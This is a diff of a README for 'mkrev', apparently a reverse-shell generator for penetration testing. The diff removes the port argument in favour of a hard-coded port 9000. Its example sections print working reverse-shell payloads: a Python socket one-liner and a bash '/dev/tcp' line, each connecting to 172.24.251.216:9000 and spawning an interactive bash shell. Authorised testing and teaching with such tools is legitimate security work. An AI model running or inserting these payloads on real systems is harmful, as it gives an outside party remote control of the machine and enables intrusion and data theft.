@@ -22,11 +22,12 @@ $ export $PATH=$HOME/bin:$PATH`
 Usage is simple where some languages (Shell options) use shorter names.
 
 ```
-$ mkrev [interface] [port] [shell]
+$ mkrev [interface] [shell]
 ```
 
-- **interface**, an interface name like eth0, enp0s3, tun0, etc. 
-- **port**, the specified port to listen
+> Port is hard-coded to 9000.
+
+- **interface**, an interface name like eth0, enp0s3, tun0, etc. (Dunno how make this work on Windows) 
 - **shell**, the scripting languages/utility name to generate the reverse shell code
 
 Shortened language names:  
@@ -38,15 +39,15 @@ Shortened language names:
 
 Example usage
 
-- Generate a python reverse shell  
+- Generate a python reverse shell
 
 	```
-	$ mkrev eth0 9000 py
+	$ mkrev eth0 py
 	python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.24.251.216",9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
 	```  
 
 - Generate a bash reverse shell
 	```
-	$ mkrev eth0 9000 bash
+	$ mkrev eth0 bash
     bash -c "bash -i >& /dev/tcp/172.24.251.216/9000 0>&1
 	```
